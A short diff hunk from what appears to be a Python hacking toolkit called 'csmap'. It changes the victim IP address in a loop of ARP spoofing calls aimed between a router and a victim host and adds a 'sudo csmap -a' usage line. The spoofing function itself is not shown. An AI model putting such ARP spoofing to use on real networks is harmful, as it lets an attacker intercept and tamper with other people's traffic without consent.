@@ -270,18 +270,17 @@ if __name__ == "__main__":
             try:
                 while True:
                     # spoof_arp("ip_of_router","ip_of_victim")
-                    ArpSpoofer.spoof_arp("192.168.1.1","192.168.1.5")
-                    ArpSpoofer.spoof_arp("192.168.1.5","192.168.1.1")
+                    ArpSpoofer.spoof_arp("192.168.1.1","192.168.1.3")
+                    ArpSpoofer.spoof_arp("192.168.1.3","192.168.1.1")
                     # spoof_arp("ip_of_victim","ip_of_router")
 
             except KeyboardInterrupt:
                 print(colored("\n[-] Stopping!!","red"))
                 sleep(2)
-                exit(0)
 
         else:
             print(
                 "csmap -c <text> -k <key> \ncsmap -s <length of password>\ncsmap -p <port no.> <ip address> ")
 
     except:
-        print("csmap -c <text> -k <key> \ncsmap -s <length of password>\ncsmap -p <port no.> <ip address> \ncsmap -m ")
+        print("csmap -c <text> -k <key> \ncsmap -s <length of password>\ncsmap -p <port no.> <ip address> \ncsmap -m \nsudo csmap -a")
